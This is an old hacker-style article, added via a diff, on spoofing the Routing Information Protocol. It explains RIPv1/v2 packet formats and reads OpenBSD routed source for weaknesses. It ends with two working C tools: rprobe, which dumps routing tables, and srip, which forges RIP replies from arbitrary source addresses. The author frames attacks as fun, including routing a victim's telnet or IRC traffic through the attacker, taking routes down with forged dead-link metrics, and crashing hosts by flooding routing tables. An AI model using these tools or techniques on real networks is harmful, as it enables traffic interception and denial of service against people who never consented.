@@ -1,0 +1,704 @@
+Spoofing RIP (Routing Information Protocol)
+by humble
+
+Overview
+--------
+
+	RIP is probably the easiest means of implementing dynamic routing
+that a network administrator has available. RIP is a protocol that is
+designed for small to medium size networks. The services needed to support
+RIP are provided with almost every TCP/IP implementation. Essentially,
+RIP provides a mechanism for a machine to keep an udpated routing table:
+one that represents the current state of the network. Routers periodically
+send a copy of their routing table to the subnet broadcast address, 
+allowing other routers to learn these routes. If a certain route is not
+updated after a good period of time, it is assumed to have gone down.
+Thus, RIP provides a simple method for routers to propagate their routing
+information, and thus communicate this information to the hosts that the
+router directly interacts with. 
+
+	There are two versions of RIP that we must consider. The first
+version of RIP communicates its routing information relative to itself.
+For instance, a RIP v1 message looks like this: "If you would like to send
+your packets to this subnet, they will get there in X hops if you send
+them through me." A RIP v2 messages, on the other hand, communicates a lot
+more information. It says: "If you would like to send your packets to this
+subnet (with a subnet mask of X), then you can send it to this person and
+it will be X hops away from it's destination." RIP version 2 communicates
+the knowledge of other routers to the network, while RIP version 1
+communicates just the knowledge of its routes.
+
+	RIP daemons can run in two modes: passive, or active. A passive
+daemon will sit on the network and watch the routers communicate their
+route information with each other. It will record this information, and
+the machine it is running on will have an updated routing table. The
+passive mode daemon will never advertise it's routes, unless a special
+condition occurs. (We will cover that later). The active mode daemon will
+continually advertise its routes to the network, and it will send its 
+routing information to any machine that requests it. The active mode
+daemon is of course listening to the other routers advertisements and
+incorporating them into it's routing table.
+
+Implementation
+--------------
+
+	As noted above, there are two versions of RIP that we must
+consider: RIPv1 and RIPv2. Both versions of the protocol use the same
+ports and general packet structure. The RIP version 2 simply fills
+in parts of the packet that version 1 mandates to be 0.
+
+	RIP messages are encapsulated in UDP datagrams bound to port 520.
+The datagram is broken out like this for version 1:
+
+0......7  8......15 16......24 24......31
+|command| |version| |         0         |
+
+| address family  | |         0         |
+|              IP address               |
+|                  0                    |
+|                  0                    |
+|                metric                 |
+  these five lines repeat for each route
+
+A quick overview of the packet:
+
+command - 1 is a request, 2 is a reply. There are other commands, but they 
+	are mostly obsolete or implementation specific.
+version - 1 for version 1, 2 for version 2
+address family - 2 for IP addresses.. This is what we will be focusing on.
+ip address - the ip address of the advertised route
+metric - (1-16) the number of hops to that route
+
+	So, what information is a RIP v1 message conveying?
+
+Say you are a passive daemon and you are listening to the broadcast traffic.
+Say a router at 100.100.0.1 sends out a RIP message advertising:
+100.100.16.0 with a metric of 3
+
+	This means that if you had a packet destined for the 100.100.16.0
+subnet, and you sent it to the router at 100.100.0.1, it would go through
+4 hops before it reached its destination. As a passive mode RIP daemon,
+you would look at your routing table and decide if 4 hops was better than
+the route you currently have recorded for that subnet. If you didn't have
+a route to that subnet, then you would add this route to your routing
+table. Now if this router didn't send out an update for this route for a
+long time (typically 3 minutes), you would know that the route has
+probably gone down. Instead of deleting the route entry from your routing
+table, you would set the metric to 16, indicating a dead link. If the
+metric on a particular route stays at 16 for a while, you would
+eventually delete it.
+
+	The reason for using 16 to represent a dead link is simple. If a
+router decides that a certain link is dead, because it hasn't recieved an
+update on it, it will mark the metric as 16. It will *still* advertise
+the route with a metric of 16. This way, other routers will pick up that
+the route is down. If the route comes back up, and a router advertises it
+at a lower metric, all the routers on the network will quickly propagate
+the new route.
+
+Lets look at version 2:
+
+0......7  8......15 16......24 24......31
+|command| |version| |   route domain    |
+
+| address family  | |    route tag      |
+|              IP address               |
+|              subnet mask              |
+|               gateway                 |
+|                metric                 |
+  these five lines repeat for each route
+
+There are a few major differences:
+
+route domain:	This is a unique ID that a routing daemon can use to identify 
+	itself. The main purpose of this is so that an administrator can have 
+	two routing daemons running on the same router.
+route tag: "The route tag exists to support exterior gateway protocols. It 
+	carries an autonomous system number for EGP and BGP." (Stevens 136)
+subnet mask: This is one of the most important parts of RIP v2. If a daemon 
+	recieves a RIP v1 message that says, "I have a route for 135.23.4.0," 
+	what does that message actually mean? It could mean that it has a host 
+	route to 135.23.4.0, or it could mean the class c starting at the 
+	network number 135.23.4.0. It could mean anything. The daemon
+	typically uses the subnet mask that is defined on the interface
+	the RIP packet was recieved upon. This may or may not be a good
+	idea. Therefore, in RIP v2, you can specify the subnet mask of
+	the route you are trying to communicate.
+gateway: RIP v2 allows you to specify the gateway machine for a particular 
+	subnet. This way, a router can advertise routes for other routers, 
+	and the network will make itself more efficient. Normally, a router 
+	that wanted to go somewhere would pick up a route from another router 
+	running RIP, send it's packets to that router, receive an ICMP redirect,
+	and adjust its routing tables accordingly. This eliminates all of this 
+	and adds more functionality to RIP.
+
+	Also, it is important to note that RIP v2 offers a form of
+authentication. If you set the first entry of your RIP packet to have an
+address family of 0xffff (all 1's), and a route tag of 2, the remaining
+16 bytes can be used as a cleartext password. This authentication scheme
+is not used often, so we don't need to worry about it.
+
+	If you would like more information about the RIP protocol,
+consult W. Richard Steven's "TCP/IP Illustrated" (Chapter 10), and the
+relevant RFC's (1058,1388).
+
+Flaws
+-----
+
+	RIP is a UDP based protocol with weak to non-existant
+authentication. Furthermore, it is stateless, meaning that a RIP daemon
+will honor replys even though it hasn't sent any requests. These factors
+make it very fun and easy to abuse. For this section of the article, I
+will be referring to code from the openbsd routed implementation (located
+in /usr/src/sbin/routed). This code should be somewhat representative of
+the daemons running on other unixes and routers. I choose this code
+because it will probably be the most secure implementation of the RIP
+protocol available, and thus our exploration will focus on the weaknesses
+of the protocol. 
+
+	The first thing we should try to do is to get a RIP daemon to
+send us it's routing information. This code to send the request is
+program #1, rprobe. I did not write a program to receive and interpret
+the RIP datagrams, although it should be fairly easy to do. Instead, I
+invoke tcpdump like this on another window:
+
+tcpdump -vv -s 6000 udp and port 520
+
+	Ok, lets look at the RIP daemon source code and try to figure out
+how we can get it to send us the routing information.
+
+	routed communicates with the kernel with a special socket of the
+AF_ROUTE domain.  It also listens for ICMP router discovery messages. We
+will be focusing on the code that handles RIP. Once routed starts up and
+initializes itself (by purging the kernel of all dynamically assigned
+routes and setting up it's sockets), it enters an infinite loop. The loop
+basically does this:
+
+	Record the Time
+	Update its list of alive interfaces
+	If it is in active mode, and it is time (once every 30 seconds), then 
+		broadcast it's routing information out to the network.
+	Figure out its schedule
+	Do a blocking select on all of it's sockets, putting them in 
+		the read fd set. 
+	If it gets new routing information from the kernel, it calls read_rt()
+	If it gets new ICMP messages, it calls read_d()
+	If it gets any RIP message off of any interface, it calls read_rip(), 
+		passing it the socket and a description of the interface from 
+		which the socket was bound to.
+
+	So, we want to look at read_rip(), which is located in input.c.
+read_rip() is a simple function, it reads the packet off of the socket,
+handles any errors, and slams it into a struct rip. It then passes this
+structure to input(). (which is also in input.c)
+
+	input() is the main function for handling RIP packets. It does a
+few sanity checks, namely making sure the version is correct, and the
+packet is of a tolerable length. Then we see a humurous comment in the
+code:
+
+        /* Notice authentication.
+         * As required by section 4.2 in RFC 1723, discard authenticated
+         * RIPv2 messages, but only if configured for that silliness.
+         *
+         * RIPv2 authentication is lame, since snooping on the wire makes
+         * its simple passwords evident.  Also, why authenticate queries?
+         * Why should a RIPv2 implementation with authentication disabled
+         * not be able to listen to RIPv2 packets with authenication, while
+         * RIPv1 systems will listen?  Crazy!
+         */
+
+	Moving on, the function goes into a large switch statement based
+on the command value in the RIP packet. This implementation has code to
+handle RIP requests, RIP replies, and turning on RIP tracing remotely. We
+are trying to get the daemon to dump it's routing tables to us, so lets
+look at the code to handle the request. First, it does some sanity
+checks, making sure the packet is the right length. Then, it loops
+through each routing message in the packet.. this is the code at the very
+beginning of the loop:
+
+              /* A single entry with family RIP_AF_UNSPEC and
+               * metric HOPCNT_INFINITY means "all routes".
+               * We respond to routers only if we are acting
+               * as a supplier, or to anyone other than a router
+               * (i.e. a query).
+               */
+              if (n->n_family == RIP_AF_UNSPEC
+                  && n->n_metric == HOPCNT_INFINITY
+                  && n == rip->rip_nets
+                  && n+1 == lim) {
+                      if (from->sin_port != htons(RIP_PORT)) {
+                              /* Answer a query from a utility
+                               * program with all we know.
+                               */
+                              supply(from, sifp, OUT_QUERY, 0,
+                                     rip->rip_vers);
+                              return;
+                      }
+
+	We can see in this part of the code a special case. If we send the
+daemon a RIP request with an address family of 0 and a metric of 16, then
+it will dump us it's routing tables. That is, if we are not bound to the
+RIP port on our side of the socket. So, if a daemon is running in passive
+mode, we can get it to send us it's routing information by sending a
+packet coming from any port besides 520. If we want to get an active
+daemon to send us it's routing information, we should address it from
+port 520. From experience, I know that some routers will not respond
+unless the source port is 520.
+
+	We can see that the daemon does not really care who it is sending
+the information too. Thus, we should be able to write a simple udp
+program that will send a datagram to a target host, (or better yet, the
+broadcast address of the target host), and it will respond to us. That
+program is rprobe, program #1. To use it, you should run tcpdump in one
+screen, and run rprobe in another. There is a program available called
+rtquery, which will do a very similiar thing, in a far more comprehensive
+manner, but it does not allow you to query a broadcast address
+(recompiling it with a SO_BROADCAST socket option should fix that).
+
+	Ok, so now we have a means of figuring out the routing information
+of all of the routers and hosts (running routed) on a RIP network. Now,
+lets look at the code that handles the RIP replies and see what rules
+there are in determining whether a particular routing entry is accepted.
+
+	First, the packet length is verified to be correct. Then, the
+packet is discarded if it is not originating from port 520. The daemon
+makes sure that it is not reacting to packets that it has sent. Next, the
+daemon checks the router that the packet originated from. If it is not a
+router that is directly connected to it, and it is not in /etc/gateways,
+then the packet is discarded. These checks are all based upon the source
+ip of the packet. The daemon then makes sure the version is either RIP v1
+or v2. If the v2 authentication is being used, the daemon will check to
+make sure the password is correct. The daemon then loops through each
+route entry in the packet.
+
+	It makes sure that the address family is 2, for IPv4 addresses.
+Then it calls check_dst(), passing it the address we specified as the
+destination in our routing entry. check_dst() (in if.c) just makes sure
+that the destination looks like a reasonable internet IP address. The
+daemon makes sure the metric is between 1 and 16. The daemon then
+attempts to verify the gateway address we have given. If it is dealing
+with a RIP v1 packet, then the gateway should be 0. However, the daemon
+appears to set the value to 0 if it is a RIP v2 packet also. I think this
+is an error in the OBSD code. I will see what tech@openbsd.org says.
+Anyway, if it does look at the gateway address, which it should, it makes
+sure that the specified gateway is on the same subnet as the interface
+which received the packet. The daemon then verifies that the netmask is
+healthy and it also will attempt to infer the netmask if it is reading a
+RIP v1 packet. The daemon also figures that is it has a default route
+already, then it won't accept a new one dynamically. Ok.... now we are
+getting into the stuff we are interested in. The daemon will break down
+one ripv2 route into several RIPv1 routes if it is necessary in order to
+express that route with the RIPv1 netmask. Now, for each route that is to
+be added, the daemon calls input_route().. which is also in input.c
+
+	If the route is not already in the routing table, and it doesn't
+specify the daemon's machine's ip as the gateway, and it has a metric
+below 16, then it will be added to the machines routing table. So, what
+this tells us is that we should be able to add any route we want to a
+machine running a RIP services, assuming it hasn't been added before. So,
+thats good, but what if we want to modify a machines routing table? 
+
+	This has some trickier rules. For each route that the daemon knows
+about, it keeps a list of "spares." This way, it records the route
+without actually committing to it. The first item in the spare list is
+the route that is actually being used. If the route change comes from the
+router that it is currently using, then it is immediately accepted. If
+the change involves the metric getting worse, it will look through its
+spares for a better option. However, if the daemon receives an update
+from one of it's spares, it will consider making it the active route, if
+it's metric is the best. Now, if the daemon receives a route update for a
+route that it knows about, but from an unknown router, then it will save
+the spare. It will only save the spare if it has a better metric than the
+current worst spare.
+
+	So, what have we learned from this? A route is basically the
+combination of a destination and a netmask. We should be able to add any
+route that we want that isn't in place, assuming the gateway is a machine
+on the same subnet as the host. We should also be able to change any
+route by offering a new one with a better metric. In situations where the
+metric is 1, and we can't offer a better metric, we can still change the
+route. What we have to do to pull this off is to tell the machine that
+all of the routes it is currently using are of metric 16 (i.e. dead) and
+that the route we are offering has a metric of 1. If we can kill off all
+of the spares it has saved, then our route will win. 
+
+	Program 2, srip uses a raw socket to send spoofed RIPv1 or RIPv2
+messages from an arbitrary source IP. This code is tested on OpenBSD 2.3
+and the latest stable Debian release (I forget the version).
+	Ok.. now we have the tools and the understanding.. What are some
+of the fun things you can do with RIP? If you happen to find someone
+who's ISP is running RIP, you could send a route message from a dead host
+on their subnet, advertising a route to somewhere that person likes to go
+(think irc server). Send it to their broadcast address, their default
+gateway will pick it up, and forward the packets on through to the dead
+host, while sending ICMP redirects to your vitcim the whole time. You
+could compile IP forwarding into your kernel, and set up routes from
+various machines that are on your subnet (but are not necessarily
+sniffable) to other hosts on your network. For instance, you could set it
+up such that everytime Bob telnets to Jim's computer, the packets bounce
+through you. 
+
+	Also, if you can determine all of the routers on a subnet, you can
+force them into dropping routes that they have picked up dynamically by
+spoofing metric 16 routes. Remember, if you can guess what router is
+advertising a particular route, you can take that route down by spoofing
+packets from that router. On some implementations, you can almost bring
+machines to a halt by flooding them with RIP requests and forcing the
+kernel to keep growing and purging its routing table. I've noticed that
+some SunOS boxes and some OS/2 machines will actually crash if you fill
+up the kernel's routing table. (This is easy to do with ICMP redirects as
+well). Perhaps the most useful thing you can do with RIP is glean
+information about how a network is setup. If you can come up with any
+interesting abuses of RIP, send me email. 
+
+Example Code
+------------
+Program 1: rprobe.c
+----------------------
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <errno.h> 
+#include <string.h> 
+#include <sys/types.h> 
+#include <netinet/in.h> 
+#include <netdb.h> 
+#include <sys/socket.h> 
+#include <sys/wait.h> 
+#include <unistd.h>
+
+#define RIP_PORT  520
+
+struct rip_message
+{
+	unsigned short family;
+	unsigned short tag;
+	unsigned long ip;
+	unsigned long netmask;
+	unsigned long gateway;
+	unsigned long metric;
+};
+
+struct rip
+{
+	unsigned char command;
+	unsigned char version;
+	unsigned short domain;
+	struct rip_message routes[1];
+};
+
+void usage(void)
+{
+	fprintf(stderr,"Usage: rprobe [-av] target\n");
+	fprintf(stderr," a:\t\tquery active mode daemons (requires root priveleges)\n");
+	fprintf(stderr," v:\t\tspecify rip version 2\n");
+	fprintf(stderr," target:\tdestination\n");
+	
+	exit(42);
+}
+
+int main(int argc, char *argv[])
+{
+	int sockfd;
+	struct sockaddr_in their_addr;
+	struct sockaddr_in ours;
+	struct hostent *he;
+	char hostname[256];
+	int localport;
+	int numbytes;
+	int ch,version;
+	struct rip evil;
+	long on=1;
+ 
+	localport=4242;
+	version=1;
+
+	while ( (ch=getopt(argc,argv,"va")) != -1)
+	{
+		switch (ch)
+		{
+			case 'v': version=2;
+				break;
+			case 'a': localport=RIP_PORT;
+				break;
+			default : usage();
+		}
+	}
+
+	argc-=optind;
+	argv+=optind;
+	
+	if (argc!=1) usage();
+
+	strncpy(hostname,argv[0],sizeof(hostname));
+
+	if ((he=gethostbyname(hostname)) == NULL) 
+	{ 
+		herror("gethostbyname");
+		exit(1);
+	}
+
+	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) 
+	{
+		perror("socket");
+		exit(1);
+	}
+
+	if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))==-1)
+	{
+		perror("setsockopt");
+		exit(1);
+	}
+
+	their_addr.sin_family = AF_INET;      /* host byte order */
+	their_addr.sin_port = htons(RIP_PORT);  /* short, network byte order */
+	their_addr.sin_addr = *((struct in_addr *)he->h_addr);
+	bzero(&(their_addr.sin_zero), 8);     /* zero the rest of the struct */
+
+	bzero(&ours,sizeof(struct sockaddr));
+	ours.sin_family = AF_INET;      /* host byte order */
+	ours.sin_port = htons(localport);  /* short, network byte order */
+	bzero(&(ours.sin_zero), 8);     /* zero the rest of the struct */
+
+	bind(sockfd,(struct sockaddr *)&ours,sizeof(struct sockaddr));
+
+	bzero(&evil,sizeof(struct rip));
+
+	evil.command=1;
+	evil.version=version;
+	evil.routes[0].metric=htonl(16);
+
+	printf("Sending packet.\n");
+	if ((numbytes=sendto(sockfd, &evil, sizeof(struct rip), 0, \
+            	(struct sockaddr *)&their_addr, sizeof(struct sockaddr))) == -1)
+	{
+		perror("recvfrom");
+		exit(1);
+       	}
+	printf("Sent %d bytes.\n",numbytes);
+	close(sockfd);
+	exit(0);
+}
+----------------------
+Program 2: srip.c
+----------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+
+/* define our own structs so this will be easier to port*/
+
+#define	IPVERSION	4
+
+struct ip_header
+{
+	unsigned char  ip_hl:4,		/* header length */
+		  ip_v:4;		/* version */
+	unsigned char  ip_tos;		/* type of service */
+	unsigned short ip_len;		/* total length */
+	unsigned short ip_id;		/* identification */
+	unsigned short ip_off;		/* fragment offset field */
+#define	IP_RF 0x8000			/* reserved fragment flag */
+#define	IP_DF 0x4000			/* dont fragment flag */
+#define	IP_MF 0x2000			/* more fragments flag */
+#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
+	unsigned char  ip_ttl;		/* time to live */
+	unsigned char  ip_p;			/* protocol */
+	unsigned short ip_sum;		/* checksum */
+	unsigned long ip_src, ip_dst; /* source and dest address */
+};
+
+struct udp_header 
+{
+	unsigned short uh_sport;		/* source port */
+	unsigned short uh_dport;		/* destination port */
+	unsigned short uh_ulen;		/* udp length */
+	unsigned short uh_sum;		/* udp checksum */
+};
+
+#define RIP_PORT  520
+
+struct rip_message
+{
+	unsigned short family;
+	unsigned short tag;
+	unsigned long ip;
+	unsigned long netmask;
+	unsigned long gateway;
+	unsigned long metric;
+};
+
+struct rip
+{
+	unsigned char command;
+	unsigned char version;
+	unsigned short domain;
+	struct rip_message routes[1];
+};
+
+struct raw_pkt 
+{
+	struct ip_header ip; 
+	struct udp_header udp;
+	struct rip rip;
+};
+
+struct raw_pkt* pkt;
+
+unsigned long int get_ip_addr(char* str)
+{
+	struct hostent *hostp;
+	unsigned long int addr;
+	if ( (addr = inet_addr(str)) == -1)
+	{
+		if ( (hostp = gethostbyname(str)))
+			return *(unsigned long int*)(hostp->h_addr);
+  		else 
+		{
+			fprintf(stderr,"unknown host %s\n",str);
+			exit(1);
+		}
+	}
+	return addr;
+}
+
+unsigned short checksum(unsigned short* addr,char len)
+{
+	register long sum = 0;
+
+	while(len > 1)
+	{
+		sum += *addr++;
+		len -= 2;
+	}
+	if(len > 0) sum += *addr;
+		while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);
+
+	return ~sum;
+}
+
+void usage(void)
+{
+	printf("Usage: srip [-2] [-n netmask] [-g gateway] source dest target metric\n");
+	printf(" 2:\t\tRIP version 2\n");
+	printf(" n:\t\tnetmask (for version 2)\n");
+	printf(" g:\t\tgateway (for version 2)\n");
+	printf(" source:\tRIP packet sender\n");
+	printf(" dest:\t\tRIP packet destination\n");
+	printf(" target:\tadvertised route\n");
+	printf(" metric:\tadvertised metric\n");
+	exit(0);
+}
+
+int main(int argc,char** argv)
+{
+	struct sockaddr_in sa;
+	int sock,packet_len;
+	int ch;
+
+	long source,dest,target,netmask,gateway;
+	int version,metric;
+
+	int on = 1;
+
+	version=1;
+	netmask=0;
+	gateway=0;
+
+	while ( (ch = getopt(argc,argv,"2n:g:"))!= -1 )
+	{
+		switch (ch)
+		{
+			case 'n': netmask=get_ip_addr(optarg);
+				break;
+			case 'g': gateway=get_ip_addr(optarg);
+				break;
+			case '2': version=2;
+				break;
+			default:usage();
+				break;
+		}
+	}
+
+	argc-=optind;
+	argv+=optind;
+
+	if (argc!=4)	usage();
+
+	source=get_ip_addr(argv[0]);
+	dest=get_ip_addr(argv[1]);
+	target=get_ip_addr(argv[2]);
+	metric=atoi(argv[3]);
+
+	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+	{
+		perror("socket");
+		exit(1);
+	}
+
+	if (setsockopt(sock,SOL_SOCKET,SO_BROADCAST,(char *)&on,sizeof(on))<0) 
+	{
+		perror("setsockopt: SO_BROADCAST");
+		exit(1);
+	}
+
+	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) 
+	{
+		perror("setsockopt: IP_HDRINCL");
+		exit(1);
+	}
+
+	sa.sin_addr.s_addr = dest;
+	sa.sin_family = AF_INET;
+
+	packet_len = sizeof(struct raw_pkt);
+	pkt = calloc((size_t)1,(size_t)packet_len);
+
+	pkt->ip.ip_v = IPVERSION;
+	pkt->ip.ip_hl = sizeof(struct ip_header) >> 2;
+	pkt->ip.ip_tos = 0;
+	pkt->ip.ip_len = htons(packet_len);
+	pkt->ip.ip_id = htons(getpid() & 0xFFFF);
+	pkt->ip.ip_off = 0;
+	pkt->ip.ip_ttl = 0xdf;
+	pkt->ip.ip_p = IPPROTO_UDP ;//UDP
+	pkt->ip.ip_sum = 0;
+	pkt->ip.ip_src = source;
+	pkt->ip.ip_dst = sa.sin_addr.s_addr;
+	pkt->ip.ip_sum = checksum((unsigned short*)pkt,sizeof(struct ip_header));
+
+	pkt->udp.uh_sport = htons(520);
+	pkt->udp.uh_dport = htons(520);
+	pkt->udp.uh_ulen = htons(sizeof(struct udp_header)+sizeof(struct rip));
+	pkt->udp.uh_sum = 0;
+
+	pkt->rip.command = 2;
+	pkt->rip.version = version;
+	pkt->rip.routes[0].family = htons(2);
+	pkt->rip.routes[0].ip = target;
+	pkt->rip.routes[0].metric = htonl(metric);
+
+	//putting in the udp checksum breaks it.
+	//someone email and explain this to me :>
+	//pkt->udp.uh_sum = checksum((unsigned short*)&(pkt->udp),
+	//sizeof(struct udp_header)+sizeof(struct rip));
+
+	if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+		exit(1);
+	}
+}
+----------------------
+
+Sources
+-------
+TCP/IP Illustrated Volume 1 by W. Richard Stevens
+OpenBSD 2.3 routed source code (deraadt / Berkeley)
